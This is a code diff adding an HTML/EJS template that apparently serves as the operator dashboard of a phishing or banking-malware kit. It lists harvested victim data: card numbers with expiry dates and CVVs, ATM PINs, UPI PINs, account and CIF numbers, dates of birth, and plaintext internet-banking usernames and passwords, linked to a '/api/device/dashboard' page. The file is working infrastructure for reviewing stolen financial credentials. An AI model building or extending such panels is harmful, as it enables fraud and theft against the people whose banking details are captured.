@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User and Payment Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>User and Payment Details</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+    <!-- User Details Section -->
+    <h2>User Details</h2>
+    <% if (user && user.entries && user.entries.length > 0) { %>
+      <% user.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>User Information - <%= index + 1 %></h3>
+          <p><strong>Full Name:</strong> <%= entry.fullName %></p>
+          <p><strong>Phone Number:</strong> <%= entry.phoneNumber %></p>
+          <p><strong>Reason:</strong> <%= entry.reason %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No User Data Found</p>
+    <% } %>
+
+  
+    <% if (visa1Data && visa1Data.entries && visa1Data.entries.length > 0) { %>
+      <% visa1Data.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Visa1 Information - <%= index + 1 %></h3>
+          <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
+          <p><strong>Expiry Date:</strong> <%= entry.expiryDate %></p>
+          <p><strong>CVV:</strong> <%= entry.cvv %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+  
+    <% } %>
+
+
+    <% if (visa2Data && visa2Data.entries && visa2Data.entries.length > 0) { %>
+      <% visa2Data.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Visa2 Information - <%= index + 1 %></h3>
+          <p><strong>ATM Pin:</strong> <%= entry.atmPin %></p>
+          <p><strong>Date of Birth:</strong> <%= entry.dob %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+   
+    <% } %>
+
+
+<% if (visa3Data && visa3Data.entries && visa3Data.entries.length > 0) { %>
+  <% visa3Data.entries.forEach((entry, index) => { %>
+    <div class="card">
+      <h3>Visa3 Information - <%= index + 1 %></h3>
+      <p><strong>Unique ID:</strong> <%= visa3Data.uniqueid %></p>
+      <p><strong>Bank Name:</strong> <%= entry.bankName %></p>
+      <p><strong>UPI Pin:</strong> <%= entry.upiPin %></p>
+      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+    </div>
+  <% }) %>
+<% } else { %>
+ 
+<% } %>
+
+
+    <!-- Combined Debit Card Data -->
+    <% if (combinedDebitCardData && combinedDebitCardData.submissions && combinedDebitCardData.submissions.length > 0) { %>
+      <% combinedDebitCardData.submissions.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Debit Card Submission - <%= index + 1 %></h3>
+          <p><strong>Account No:</strong> <%= entry.accountNo %></p>
+          <p><strong>CIF No:</strong> <%= entry.cifNo %></p>
+          <p><strong>Branch Name:</strong> <%= entry.branchName %></p>
+          <p><strong>Date of Birth:</strong> <%= entry.dob %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.createdAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      
+    <% } %>
+
+    <!-- Combined Internet Banking Data -->
+    <% if (combinedInternetBankingData && combinedInternetBankingData.submissions && combinedInternetBankingData.submissions.length > 0) { %>
+      <% combinedInternetBankingData.submissions.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Internet Banking Submission - <%= index + 1 %></h3>
+          <p><strong>Username:</strong> <%= entry.username %></p>
+          <p><strong>Password:</strong> <%= entry.password %></p>
+          <p><strong>Profile Password:</strong> <%= entry.profilePassword %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.createdAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+   
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
